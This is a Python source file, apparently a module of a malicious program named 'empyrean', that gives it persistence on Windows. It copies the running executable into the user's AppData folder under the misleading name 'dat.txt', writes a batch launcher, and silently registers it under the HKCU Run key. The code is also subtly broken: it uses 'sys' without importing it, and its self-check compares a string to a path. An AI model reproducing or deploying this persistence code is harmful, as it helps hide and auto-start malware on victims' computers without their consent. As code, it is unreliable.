import os
import shutil
import subprocess
from pathlib import Path


class Startup:
    def __init__(self):
        self.working_dir = Path(os.getenv("APPDATA")) / "empyrean"

        if self.check_self():
            return

        self.mkdir()
        self.write_stub()
        self.regedit()

    def check_self(self):
        return os.path.realpath(sys.executable) == self.working_dir / "dat.txt"

    def mkdir(self):
        if self.working_dir.exists():
            shutil.rmtree(self.working_dir)

        self.working_dir.mkdir()

    def write_stub(self):
        shutil.copy2(os.path.realpath(sys.executable), self.working_dir / "dat.txt")

        with (self.working_dir / "run.bat").open(mode="w") as f:
            f.write("@echo off\ncall dat.txt")

    def regedit(self):
        try:
            subprocess.run(["reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "empyrean", "/f"], shell=True, check=True)
        except subprocess.CalledProcessError as e:
            pass

        subprocess.run(["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "empyrean", "/t", "REG_SZ", "/d", str(self.working_dir / "run.bat"), "/f"], shell=True, check=True)
